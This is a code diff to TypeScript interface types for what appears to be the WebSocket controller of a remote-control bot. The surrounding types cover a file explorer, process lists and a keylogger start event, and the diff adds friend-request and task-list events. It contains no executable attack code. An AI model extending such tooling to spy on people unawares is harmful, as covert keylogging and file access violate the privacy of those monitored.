@@ -1,4 +1,4 @@
-import { DirEntry } from "@/src/modules/ws-client/types/tasks.type";
+import { DirEntry, Process } from "@/src/modules/ws-client/types/tasks.type";
 
 export interface WsBotSendMessage {
   title?: string;
@@ -7,6 +7,11 @@ export interface WsBotSendMessage {
 }
 
 export interface WsBotConnectionEvent {
+  controllerid: string;
+  clientid: string;
+}
+export interface WsBotAddFriendEvent {
+  accept: boolean;
   controllerid: string;
   clientid: string;
 }
@@ -37,6 +42,11 @@ export interface WsBotSendExplorerEvent {
   files: DirEntry[];
   folder: string;
   relativepath: string;
+}
+
+export interface WsBotSendTaksEvent {
+  controllerid: string;
+  tasks: Process[];
 }
 
 export interface WsBotKeyLoggerStart {
